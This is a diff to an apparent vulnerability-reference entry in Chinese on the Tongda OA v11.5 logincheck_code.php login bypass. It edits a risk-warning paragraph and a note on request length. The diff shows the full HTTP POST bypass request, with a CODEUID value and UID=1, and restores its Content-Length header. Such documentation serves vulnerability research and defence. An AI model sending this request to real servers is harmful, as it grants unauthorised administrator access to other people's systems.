@@ -41,7 +41,7 @@ schema_version: "1"
 
 ## 操作风险
 
-现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -84,13 +84,14 @@ Accept-Encoding: gzip
 POST /logincheck_code.php HTTP/1.1
 Host: 
 User-Agent: Go-http-client/1.1
+Content-Length: 56
 Content-Type: application/x-www-form-urlencoded
 Accept-Encoding: gzip
 
 CODEUID=%7BD384F12E-A758-F44F-8A37-20E2568306A7%7D&UID=1
 ```
 
-> 请求长度说明：原资料 Content-Length 为 56；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 56；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![image-20220520154005687](./.resource/通达OA-v11.5-logincheck_code.php-登陆绕过漏洞/media/202205201540724.png)
 
